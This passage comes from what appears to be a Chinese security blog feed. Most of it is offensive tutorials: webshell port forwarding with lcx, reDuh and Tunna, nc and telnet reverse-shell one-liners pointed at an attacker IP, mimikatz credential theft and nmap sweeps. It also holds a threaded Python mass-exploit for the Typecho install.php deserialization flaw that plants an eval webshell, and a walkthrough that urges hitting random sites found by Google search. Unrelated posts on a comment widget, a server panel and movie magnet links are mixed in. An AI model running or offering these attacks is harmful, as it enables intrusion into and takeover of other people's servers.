class=\"undefined\"></span></div><div class=\"line\"><span class=\"xml\">        var notify = '<span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">theme.valine.notify</span> %&gt;</span>' == true ? true : false;</span></div><div class=\"line\"><span class=\"xml\">        var verify = '<span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">theme.valine.verify</span> %&gt;</span>' == true ? true : false;</span></div><div class=\"line\"><span class=\"undefined\">        var GUEST_INFO = ['nick','mail','link'];</span></div><div class=\"line\"><span class=\"xml\">        var guest_info = '<span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">theme.valine.guest_info</span> %&gt;</span>'.split(',').filter(function(item)&#123;</span></div><div class=\"line\"><span class=\"undefined\">            return GUEST_INFO.indexOf(item) &gt; -1</span></div><div class=\"line\"><span class=\"undefined\">        &#125;);</span></div><div class=\"line\"><span class=\"undefined\">        guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;</span></div><div class=\"line\"><span class=\"undefined\">        window.valine = new Valine(&#123;</span></div><div class=\"line\"><span class=\"undefined\">            el: '.vcomment',</span></div><div class=\"line\"><span class=\"undefined\">            notify: notify,</span></div><div class=\"line\"><span class=\"undefined\">            verify: verify,</span></div><div class=\"line\"><span class=\"xml\">            appId: \"<span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">theme.valine.appid</span> %&gt;</span>\",</span></div><div class=\"line\"><span class=\"xml\">            appKey: \"<span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">theme.valine.appkey</span> %&gt;</span>\",</span></div><div class=\"line\"><span class=\"xml\">            avatar:'<span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">theme.valine.avatar</span> %&gt;</span>',</span></div><div class=\"line\"><span class=\"xml\">            placeholder: \"<span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">theme.valine.placeholder</span> %&gt;</span>\",</span></div><div class=\"line\"><span class=\"undefined\">            guest_info:guest_info,</span></div><div class=\"line\"><span class=\"xml\">            pageSize:'<span class=\"tag\">&lt;<span class=\"name\">%=</span> <span class=\"attr\">theme.valine.pageSize</span> %&gt;</span>'</span></div><div class=\"line\"><span class=\"undefined\">        &#125;);</span></div><div class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div></pre></td></tr></table></figure>\n</li>\n</ol>\n<h1 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h1><p>这个狗逼评论系统花了我一下午时间，找了很多资料，我在这里都贴出来，如果你看了我的文章还不会，请参考以下内容。<br><a href=\"https://ioliu.cn/2017/add-valine-comments-to-your-blog/\" target=\"_blank\" rel=\"external\">Valine – 一款极简的评论系统</a><br><a href=\"https://panjunwen.com/diy-a-comment-system/#云引擎一键部署\" target=\"_blank\" rel=\"external\">Valine: 独立博客评论系统解决方案</a> //这个相当于给评论系统搭建了后台管理  进阶必看<br><a href=\"http://liujiannn.com/note/2017.10.25/\" target=\"_blank\" rel=\"external\">hexo搭建博客后magnetic主题如何添加valine评论系统</a> //适用于magenetic主题<br><a href=\"https://www.yfzzweb.com/Hexo/hexo-valine/#more\" target=\"_blank\" rel=\"external\">Hexo优化 — 一款极简的评论系统</a> //适用于next主题</p>\n","categories":[],"tags":[]},{"title":"Mark一些内网漫游的知识","url":"http://www.chabug.org/2017/11/05/neiwang/","content":"<p>当我们获取到一个webshell的时候，发现外网ip无法链接，但3389开放，那很有可能是内网服务器，下面我将介绍几款有关内网转发的工具。</p>\n<p><strong>注意本文较长，请耐心阅读。</strong></p>\n<h1 id=\"内网转发的工具\"><a href=\"#内网转发的工具\" class=\"headerlink\" title=\"内网转发的工具\"></a>内网转发的工具</h1><h2 id=\"Lcx-exe工具使用\"><a href=\"#Lcx-exe工具使用\" class=\"headerlink\" title=\"Lcx.exe工具使用\"></a>Lcx.exe工具使用</h2><p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p>\n<p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>\n<p>首先在本地进行监听，监听51端口并转发到33891端口</p>\n<p><code>lcx.exe -listen 51 33891</code><br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl709rlimyj30fe04laag.jpg\" alt=\"\"></p>\n<p>在webshell中运行</p>\n<p><code>lcx.exe -slave 192.168.1.100 51 192.168.80.139 3389</code><br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl709rlp11j30fe032mxi.jpg\" alt=\"\"></p>\n<p>远程桌面访问33891端口<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl709rlvnbj30bh06edge.jpg\" alt=\"\"></p>\n<p>使用创建的用户名密码登录服务器<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl709rtqv8j30b60a7gmf.jpg\" alt=\"\"></p>\n<h2 id=\"Reduh内网反弹\"><a href=\"#Reduh内网反弹\" class=\"headerlink\" title=\"Reduh内网反弹\"></a>Reduh内网反弹</h2><p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。<br>这里我们以php网站为例，首先将php文件上传到服务器端。</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70dvdrdjj30al03ymx3.jpg\" alt=\"\"></p>\n<p>浏览器中访问上传的webshell，提示以下内容说明解析成功</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70dve5khj30ev04xdfw.jpg\" alt=\"\"></p>\n<p>用客户端连接服务端</p>\n<p><code>java -jar reDuhClient.jar http://192.168.80.139/zvuldrill/reDuh.php</code></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70dvepjxj30fe05675f.jpg\" alt=\"\"></p>\n<p>本地连接1010端口<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">nc.exe -vv localhost 1010</div><div class=\"line\">[createTunnel]1235:127.0.0.1:3389</div></pre></td></tr></table></figure></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70dvebctj30fe02574j.jpg\" alt=\"\"></p>\n<p>远程登录</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70dveww8j30bc06egm4.jpg\" alt=\"\"></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70dvew5lj30fe0as74z.jpg\" alt=\"\"></p>\n<h2 id=\"Tunna内网反弹\"><a href=\"#Tunna内网反弹\" class=\"headerlink\" title=\"Tunna内网反弹\"></a>Tunna内网反弹</h2><p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70ipcj5oj307l055dfq.jpg\" alt=\"\"></p>\n<p>这里使用php网站进行测试，上传php后门</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70ipccknj30fe04ujrl.jpg\" alt=\"\"></p>\n<p><code>python proxy.py -u http://192.168.80.139/zvuldrill/conn.php -l 1234 -r 3389 -v –s</code></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70ipj2cmj30fe02sgm1.jpg\" alt=\"\"></p>\n<p>远程连接</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70ipd407j30bm06it9c.jpg\" alt=\"\"></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70ipfrlij30fe0agdga.jpg\" alt=\"\"></p>\n<h2 id=\"Linux系统通过nc反弹shell\"><a href=\"#Linux系统通过nc反弹shell\" class=\"headerlink\" title=\"Linux系统通过nc反弹shell\"></a>Linux系统通过nc反弹shell</h2><p>首先，攻击端进行监听</p>\n<p><code>nc.exe -lvnp 2333</code><br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70lu49knj30cs01pmwz.jpg\" alt=\"\"></p>\n<p>服务器端执行</p>\n<p><code>mknod /tmp/backpipe p</code></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70lu4kh7j30ap024glh.jpg\" alt=\"\"></p>\n<p><code>/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.101 2333 1&gt;/tmp/backpipe</code><br>Ip为攻击端ip<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70lu4sdkj30fe01haa9.jpg\" alt=\"\"></p>\n<p>执行命令，查看发现反弹成功</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70lu55pij30fe05ct9a.jpg\" alt=\"\"></p>\n<h2 id=\"内置命令反弹\"><a href=\"#内置命令反弹\" class=\"headerlink\" title=\"内置命令反弹\"></a>内置命令反弹</h2><p><code>nc.exe -lvnp 2333</code><br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70lu4od1j30cl01g0si.jpg\" alt=\"\"><br>服务器端执行</p>\n<p><code>mknod /tmp/backpipe p</code><br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70lu4g29j30cc00nwec.jpg\" alt=\"\"><br><code>telnet 192.168.1.101 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</code><br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70lufr63j30fe01tq3s.jpg\" alt=\"\"></p>\n<p>反弹成功</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70lu8loaj30fe09qmyq.jpg\" alt=\"\"></p>\n<h1 id=\"获取更多服务器\"><a href=\"#获取更多服务器\" class=\"headerlink\" title=\"获取更多服务器\"></a>获取更多服务器</h1><p>上面讲了我们如何进入进入一台内网系统，既然我们已经获得了一台内网服务，那么我们如何获取更多服务器呢</p>\n<p>我们可能会想到目标系统是什么，安装了哪些应用，可能存在的漏洞等等。<br>同样，我们需要收集信息，来帮助更好的入侵其他主机，下面是一些常用的cmd命令，还有很多可自行学习<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">net user                               ------ 本机用户列表</div><div class=\"line\">net localhroup administrators          ------ 本机管理员[通常含有域用户]</div><div class=\"line\">net user /domain                       ------ 查询域用户</div><div class=\"line\">net group /domain                      ------ 查询域里面的工作组</div><div class=\"line\">net group &quot;domain admins&quot; /domain      ------ 查询域管理员用户组</div><div class=\"line\">net localgroup administrators /domain  ------ 登录本机的域管理员</div><div class=\"line\">net time /domain                       ------ 判断主域，主域服务器都做时间服务器</div><div class=\"line\">net config workstation                 ------ 当前登录域</div></pre></td></tr></table></figure></p>\n<h2 id=\"密码获取\"><a href=\"#密码获取\" class=\"headerlink\" title=\"密码获取\"></a>密码获取</h2><p>既然已经拿下服务器，那么我们就要获得服务器的密码，windows可以使用mimikatz获取用户名及密码，因为很有可能管理员将其他系统设置成相同的用户名密码。所以在其他内网系统可能同样适用。<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70r11bxzj30fe08wgn1.jpg\" alt=\"\"></p>\n<p>可以看到既有hash值，也有明文用户名密码。</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70r11scpj30fe08smyx.jpg\" alt=\"\"></p>\n<h2 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h2><p>既然已经在一个内网，我们首先应该想到的就是探测有什么服务器，有哪些开放端口等等，可以使用nmap，扫描C段，看看有多少台在线服务器。</p>\n<p>扫描存活主机，既然是扫描存活主机，那么当然越快越好（个人喜好）</p>\n<p><code>nmap -PE -sn -T4 192.168.80.1/24</code></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70r141hbj30fe03rdho.jpg\" alt=\"\"></p>\n<p>我们已经知道那些ip是存活主机，那么就可以进一步获取各个系统的开放端口</p>\n<p><code>nmap -sS -sV -O -p0-65535 192.168.80.145</code></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70r13kwpj30fe05xjux.jpg\" alt=\"\"></p>\n<p>可以看到开放的端口以及服务等服务器信息</p>\n<p>同样，在内网也会存在很多不打系统补丁的情况，类似这次“WannaCry”虽然补丁已经出现一段时间，各大安全公司也好，各个安全部门也好都会提前预警打补丁，但是呢,你懂的，所以说，对某些不需要使用的端口及服务，直接停掉，以免临时抱佛脚，伤不起啊……<br>如果有系统漏洞，那么我们就可以使用matesploit进行溢出攻击等等</p>\n<h2 id=\"弱口令\"><a href=\"#弱口令\" class=\"headerlink\" title=\"弱口令\"></a>弱口令</h2><p>同样，弱口令也是内网拿服务器的手段，说到弱口令就不得不说1433的mssql，3306的mysql，1521的Oracle，10050 的zabbix，7001的weblogic，8080的tomcat等等，都会存在弱口令的情况，但也存在被修改的情况，不过管理员嘛都是怕麻烦，会存在各种规律以免自己忘记，甚至有些管理员直接将某些账号密码写到某个文件夹中，这看你喽……</p>\n<h2 id=\"嗅探\"><a href=\"#嗅探\" class=\"headerlink\" title=\"嗅探\"></a>嗅探</h2><p>也可以使用嗅探方法，如Cain，可以探测本地程序缓存的密码，通过嗅探器可以嗅探到相邻机器的username和password.。</p>\n<h1 id=\"powershell-amp-PowerSploit\"><a href=\"#powershell-amp-PowerSploit\" class=\"headerlink\" title=\"powershell &amp; PowerSploit\"></a>powershell &amp; PowerSploit</h1><h2 id=\"powershell\"><a href=\"#powershell\" class=\"headerlink\" title=\"powershell\"></a>powershell</h2><p>powershell基础学习，如果想了解powershell渗透测试原理，需要进行简单脚本开发。推荐网址：<a href=\"http://www.pstips.net/powershell-executing-external-commands.html\" target=\"_blank\" rel=\"external\">http://www.pstips.net/powershell-executing-external-commands.html</a></p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl70r141hkj30en09f430.jpg\" alt=\"\"><br>基础部分就不给大家在细介绍，大家可以根据提供网址进行学习。</p>\n<h2 id=\"Powershell的优秀之处\"><a href=\"#Powershell的优秀之处\" class=\"headerlink\" title=\"Powershell的优秀之处\"></a>Powershell的优秀之处</h2><ol>\n<li>代码运行在内存中可以不去接触磁盘</li>\n<li>从另一个系统中下载代码并执行</li>\n<li>很多安全产品并不能监测到powershell的活动</li>\n<li>cmd.exe通常被阻止运行，但是powershell不会。<br>本次主要是简单介绍下powersploit，后续会出一套关于powershell系列课程。</li>\n</ol>\n<h2 id=\"PowerSploit\"><a href=\"#PowerSploit\" class=\"headerlink\" title=\"PowerSploit\"></a>PowerSploit</h2><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。</p>\n<p>项目地址：<a href=\"https://github.com/PowerShellMafia/PowerSploit\" target=\"_blank\" rel=\"external\">https://github.com/PowerShellMafia/PowerSploit</a></p>\n<p>代码执行（CodeExecution）</p>\n<ul>\n<li>Invoke-DllInjection</li>\n<li>Invoke-ReflectivePEInjection</li>\n<li>Invoke-Shellcode</li>\n<li>Invoke-WmiCommand</li>\n</ul>\n<p>脚本修改（ScriptModification）</p>\n<ul>\n<li>Out-EncodedCommand</li>\n<li>Out-CompressedDll</li>\n<li>Out-EncryptedScript</li>\n<li>Remove-Comments</li>\n</ul>\n<p>权限维持（Persistence）</p>\n<ul>\n<li>New-UserPersistenceOption</li>\n<li>New-ElevatedPersistenceOption</li>\n<li>Add-Persistence</li>\n<li>Install-SSP</li>\n<li>Get-SecurityPackages</li>\n</ul>\n<p>绕过杀毒软件（AntivirusBypass）</p>\n<ul>\n<li><p>Find-AVSignature<br>信息收集（Exfiltration）</p>\n</li>\n<li><p>这个文件夹主要是收集目标主机上的信息。<br>信息侦察（Recon）</p>\n</li>\n<li><p>这个文件夹主要是以目标主机为跳板进行内网主机侦察。</p>\n</li>\n</ul>\n<p>ending..</p>\n","categories":[],"tags":[]},{"title":"AppNode Linux服务器集群管理面板","url":"http://www.chabug.org/2017/11/04/appnode-panel/","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p><a href=\"https://www.appnode.com/\" target=\"_blank\" rel=\"external\">AppNode</a> 是一款用于管理 Linux 服务器的软件。</p>\n<p>它基于 Web 页面进行可视化操作，不但可以帮助不熟悉 Linux 命令的用户无障碍地管理他们的 Linux 服务器，也可以帮助 Linux 运维人员提升运维效率。直接上图把。<br><img src=\"https://www.appnode.com/images/home/desktop.png\" alt=\"\"><br><strong>可视化、简易高效</strong><br><img src=\"https://www.appnode.com/images/home/nodemgr.png\" alt=\"\"><br><strong>集中式设计，快速切换管理</strong><br><img src=\"https://www.appnode.com/images/home/sitemgr.png\" alt=\"\"><br><strong>强大的网站管理功能</strong><br><img src=\"https://www.appnode.com/images/home/apps.png\" alt=\"\"><br><strong>快速安装升级，丰富的软件市场</strong><br><img src=\"https://www.appnode.com/images/home/iptables.png\" alt=\"\"><br><strong>多重安全加固，资源实时监控</strong></p>\n<h1 id=\"公告\"><a href=\"#公告\" class=\"headerlink\" title=\"公告\"></a>公告</h1><p>尊敬的 AppNode 用户，你好！<br>2017.11.1 是 AppNode 立项三周年的日子，为答谢大家这三年来对我们的支持，也感谢趣云公司大股东的强势入驻，自今日起，AppNode 永久免费啦 ！！！<br>是的，你没看错，现有功能全部免费，并且<strong>永久免费</strong>！！！<br>再次感谢所有用户的支持和信赖，我们将秉承初心，砥砺前行，继续开发，致力于为新老用户提供更优质、更稳定的管理面板产品而努力！<br><code>## 近两个月内已购买收费版本的用户，可在官网管理后台提交财务工单申请全额退费 ##</code></p>\n<h1 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h1><ul>\n<li>一个控制中心控制多台服务器</li>\n<li>全新网站管理，超强的的建站功能</li>\n<li>支持一键安装常用网站程序</li>\n<li>最全面的 PHP 扩展模块，100 + 个</li>\n<li>支持 MariaDB、MySQL、AliSQL</li>\n<li>支持断点上传不限大小的文件管理</li>\n<li>强大的可视化分区管理</li>\n<li>支持备份到 FTP/SSH 和各种常见云存储</li>\n<li>支持同步到云存储</li>\n<li>支持 Node.js 运行环境</li>\n<li>支持按端口或域名统计流量</li>\n<li>强大的系统监控和报警功能</li>\n<li>支持 Redis/Memcache 内存缓存</li>\n<li>支持 Supervisord 进程托管</li>\n<li>支持 frp 内网穿透</li>\n<li>支持 rsync 同步</li>\n<li>支持 Lsyncd 实时同步</li>\n<li>支持 Git 服务器搭建</li>\n<li>支持 Samba 服务器搭建<br>应用市场里目前共有 40 多个应用，还在不断继续增加。</li>\n</ul>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><p>要求：</p>\n<blockquote>\n<p>操作系统：CentOS 6.x 32/64位<br>          CentOS 7.x 64位<br>          （暂不支持 Ubuntu、Debian）。<br>          内存要求：<br>          <strong>建议可用内存在 512MB 以上。</strong></p>\n</blockquote>\n<p><a href=\"https://www.appnode.com/install\" target=\"_blank\" rel=\"external\">点这里查看安装命令</a></p>\n<h1 id=\"演示\"><a href=\"#演示\" class=\"headerlink\" title=\"演示\"></a>演示</h1><iframe src=\"https://www.appnode.com/views/partials/common/install-demo.min.html\" width=\"850px\" height=\"750px\" name=\"topFrame\" scrolling=\"No\" noresize=\"noresize\" frameborder=\"0\" id=\"topFrame\"></iframe>\n\n<h1 id=\"评测\"><a href=\"#评测\" class=\"headerlink\" title=\"评测\"></a>评测</h1><ul>\n<li>与<a href=\"www.bt.cn\">宝塔面板</a>相比起来，这款面板有更多的插件。</li>\n<li>宝塔不限制建站数量，AppNode限制最多3个网站。</li>\n<li>宝塔提供免费的SSL证书。</li>\n<li>总得来说是一款不错的面板。推荐使用。</li>\n</ul>\n","categories":[],"tags":[]},{"title":"战狼2超清和4k资源","url":"http://www.chabug.org/2017/11/04/zhanlang2-4k/","content":"<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl63bioaavj30ps0eeq3d.jpg\" alt=\"画质体验\"></p>\n<p>复制磁力链到百度网盘离线</p>\n<p>1080P磁力：<code>magnet:?xt=urn:btih:106BC0651796AE46BACF6CF92C658FD754576F38</code></p>\n<p>4K磁力：<code>magnet:?xt=urn:btih:7E364FE1EF493761AA7C2C4231F5D8DC34DF90FE</code></p>\n","categories":[],"tags":[]},{"title":"Typecho 反序列化漏洞批量脚本","url":"http://www.chabug.org/2017/11/03/typecho-batch/","content":"<p>来自<a href=\"http://exp10it.tk/2017/11/05/typecho-exploit/\" target=\"_blank\" rel=\"external\">@X1r0z</a> 大佬的批量Python小脚本<br>工具没什么亮点, 支持批量而已。<br><a href=\"http://www.chabug.org/2017/11/03/typecho-install/\">漏洞详情请看这里</a></p>\n<p>生成地址 domain/p0.php 密码 p0<br>**Usage:</p>\n<p>  typecho.py url</p>\n<p>  typecho.py url.txt**<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"></div><div class=\"line\">lock = threading.RLock()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">attack</span><span class=\"params\">(u)</span>:</span></div><div class=\"line\"></div><div class=\"line\">    url = u + <span class=\"string\">'/install.php?finish=1'</span></div><div class=\"line\">    payload =  <span class=\"string\">'YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=='</span></div><div class=\"line\">    lock.acquire()</div><div class=\"line\">    <span class=\"keyword\">try</span>:</div><div class=\"line\">        r = requests.get(url,cookies=&#123;<span class=\"string\">'__typecho_config'</span>:payload&#125;,headers=&#123;<span class=\"string\">'Referer'</span>:url&#125;)</div><div class=\"line\">        <span class=\"keyword\">if</span> r.status_code == <span class=\"number\">500</span>:</div><div class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">'[+] Shell: '</span> + u + <span class=\"string\">'/p0.php '</span> + <span class=\"string\">'Pass: p0'</span></div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">'[-] Failed'</span></div><div class=\"line\">    <span class=\"keyword\">except</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'[-] Connect Error'</span></div><div class=\"line\">    lock.release()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">usage</span><span class=\"params\">()</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'[*] Exploit for Typecho'</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'[*] usage:'</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'    typecho.py url'</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'    typecho.py url.txt'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> len(sys.argv)&lt;<span class=\"number\">2</span>:</div><div class=\"line\">        usage()</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>].split(<span class=\"string\">'.'</span>)[<span class=\"number\">-1</span>] == <span class=\"string\">'txt'</span>:</div><div class=\"line\">            <span class=\"keyword\">with</span> open(sys.argv[<span class=\"number\">1</span>]) <span class=\"keyword\">as</span> f:</div><div class=\"line\">                list = f.read().split(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">            <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> list:</div><div class=\"line\">                t = threading.Thread(target=attack,args=(u,))</div><div class=\"line\">                t.start()</div><div class=\"line\">            t.join()</div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            attack(sys.argv[<span class=\"number\">1</span>])</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/X1r0z/typecho-exploit\" target=\"_blank\" rel=\"external\">GitHub地址</a></p>\n","categories":[],"tags":[]},{"title":"Typecho利用工具","url":"http://www.chabug.org/2017/11/03/typecho-tools/","content":"<p>今天刚写了typecho的漏洞分析文章，现在再发一个利用工具。<br>只有一个按钮，你可以什么都不需要懂，只需要点两下就完成了hack。</p>\n<h1 id=\"运行工具\"><a href=\"#运行工具\" class=\"headerlink\" title=\"运行工具\"></a>运行工具</h1><p>解开压缩包后，直接执行typecho.exe （lib目录下包含了php相关的库）。</p>\n<p>将要进行测试的typecho网站的url复制到最上面的文本框中。</p>\n<p>下面大的白框是信息回显窗口。</p>\n<p>提供一个关键字<code>power by typecho</code> 再来一个<code>© 2017 由 Typecho 强力驱动.Theme by</code><br>我通过谷歌随机找了一个Typecho网站进行测试。</p>\n<h1 id=\"检测漏洞\"><a href=\"#检测漏洞\" class=\"headerlink\" title=\"检测漏洞\"></a>检测漏洞</h1><p>这个漏洞来源于install.php文件，这个文件不会自动删除，但可以被手动删除。</p>\n<p>要成功利用该漏洞，网站必须没有删除install.php文件，同时也没有升级到最新的beta修复版本。</p>\n<p>选好目标网站后，所以第一步就是检测是否存在漏洞。<br><img src=\"http://ww1.sinaimg.cn/large/006xriyngy1fl65q04cebj31hc0sm79c.jpg\" alt=\"\"><br>选中【检测漏洞】单选钮，再点击【执行】按钮。</p>\n<p>如上图，如果成功回显了phpinfo的信息，说明网站存在漏洞，并且可以成功利用。</p>\n<h1 id=\"释放shell\"><a href=\"#释放shell\" class=\"headerlink\" title=\"释放shell\"></a>释放shell</h1><p>第二步选中【释放shell】单选钮，再点击【执行】按钮。</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriyngy1fl65q4uhqyj31hc0smaat.jpg\" alt=\"\"><br>如上图：回显“shell释放成功：expsky.php”，说明webshell文件成功生成。</p>\n<p>（个别网站如果没有写入权限，这步可能会失败）</p>\n<h1 id=\"验证shell\"><a href=\"#验证shell\" class=\"headerlink\" title=\"验证shell\"></a>验证shell</h1><p>对刚刚释放的webshell是否能正常工作进行验证。<br><img src=\"http://ww1.sinaimg.cn/large/006xriyngy1fl65q4wqerj31hc0smtde.jpg\" alt=\"\"><br>第三步选中【验证shell】单选钮，再点击【执行】按钮。</p>\n<p>如上图，如果phpinfo再次成功回显，说明刚刚生产的webshell已经可以正常工作。</p>\n<h1 id=\"菜刀连接\"><a href=\"#菜刀连接\" class=\"headerlink\" title=\"菜刀连接\"></a>菜刀连接</h1><blockquote>\n<p>webshell地址：网站域名/expsky.php<br>webshell密码：expsky</p>\n</blockquote>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriyngy1fl65q024bgj319a0kadhi.jpg\" 